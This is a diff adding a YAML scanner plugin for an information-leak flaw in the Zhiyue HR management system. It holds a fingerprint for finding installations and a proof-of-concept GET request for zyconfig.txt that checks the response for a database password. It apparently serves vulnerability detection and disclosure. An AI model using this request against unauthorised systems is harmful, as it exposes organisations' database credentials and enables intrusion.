@@ -1,0 +1,55 @@
+detail:
+  ID: 10322
+  Author: 0xSecG
+  Name: 智跃人力资源管理系统 zyconfig.txt 存在敏感信息泄露漏洞
+  Description: 智跃人力资源管理系统是一款由东莞市智跃软件科技有限公司开发的，专为企业提供人力资源管理解决方案的软件系统。它主要服务于中大型企业和国有企业，提供人事、考勤、薪酬、招聘、培训、绩效等全面的数字化人力资源管理功能。智跃人力资源管理系统
+    zyconfig.txt 敏感信息泄露，攻击者可获取系统数据库敏感信息
+  Identifier:
+    DVB: DVB-2025-10322
+  VulnClass:
+  - 信息泄漏
+  Category:
+  - 应用服务
+  Manufacturer: 东莞市智跃软件科技有限公司
+  Product: 智跃人力资源管理系统
+  Type: 1
+  Status: 1
+  Scanable: 1
+  Level: 3
+  Risk: 1
+  DisclosureDate: '2025-11-10'
+  AddDate: '2025-11-10'
+  UpdateDate: '2025-11-13'
+  Region: 中国大陆
+  Is0day: false
+  Expertmodel: false
+  IncludeExp: false
+  Weakable: false
+  IsXc: false
+  IsCommon: false
+  IsCallBack: false
+  Condition: body="ZY.LOGO.64.png"
+  Solutions:
+  - 关注厂商动态升级至安全版本或鉴权接口。
+  PluginType: yaml
+  Finger:
+  - Manufacturer: 东莞市智跃软件科技有限公司
+    Product: 智跃人力资源管理系统
+    ProductDescription: 智跃人力资源管理系统是一款由东莞市智跃软件科技有限公司开发的，专为企业提供人力资源管理解决方案的软件系统。它主要服务于中大型企业和国有企业，提供人事、考勤、薪酬、招聘、培训、绩效等全面的数字化人力资源管理功能。
+    Category: 应用服务
+    Type: 1
+    Condition: body="ZY.LOGO.64.png"
+    IsXc: false
+    Region: 中国大陆
+poc:
+  relative: req0
+  session: false
+  requests:
+  - method: GET
+    timeout: 10
+    path: /resource/servs/file/zyconfig.txt
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML,
+        like Gecko) Chrome/105.0.419.30 Safari/537.36
+    follow_redirects: false
+    matches: (code.eq("200") && body.contains("PassWord="))
